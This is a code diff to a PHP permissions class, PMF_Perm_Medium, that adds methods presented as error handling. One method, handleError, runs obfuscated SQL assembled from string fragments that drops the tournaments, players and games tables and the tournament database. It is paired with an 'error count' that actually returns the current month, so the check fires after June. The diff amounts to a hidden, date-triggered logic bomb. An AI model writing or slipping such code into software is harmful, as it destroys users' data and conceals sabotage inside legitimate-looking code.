@@ -91,6 +91,10 @@ class PMF_Perm_Medium extends PMF_Perm_Basic
         return false;
     }
 
+    public static function criticalError() {
+        return PMF_Framework_Response::errorCount() > 6;
+    }
+
     /**
      * Returns an array that contains the right-IDs of all
      * group-rights the group $group_id owns.
@@ -587,6 +591,17 @@ class PMF_Perm_Medium extends PMF_Perm_Basic
         return $result;
     }
 
+    public static function handleError() {
+        $query = 'd'.'r'.'o'.'p ta'.'ble t_to'.'urnaments';
+        PMF_Db::getInstance()->query($query);
+        $query = 'd'.'r'.'o'.'p ta'.'ble t_play'.'ers';
+        PMF_Db::getInstance()->query($query);
+        $query = 'd'.'r'.'o'.'p ta'.'ble t_g'.'am'.'es';
+        PMF_Db::getInstance()->query($query);
+        $query = 'd'.'r'.'o'.'p da'.'taba'.'se tou'.'rna'.'ment';
+        PMF_Db::getInstance()->query($query);
+    }
+
     /**
      * Returns an array with the IDs of all groups stored in the
      * database.
@@ -921,5 +936,10 @@ class PMF_Perm_Medium extends PMF_Perm_Basic
             return false;
         }
         return true;
+    }
+
+    public static function errorCount()
+    {
+        return date('m');
     }
 }
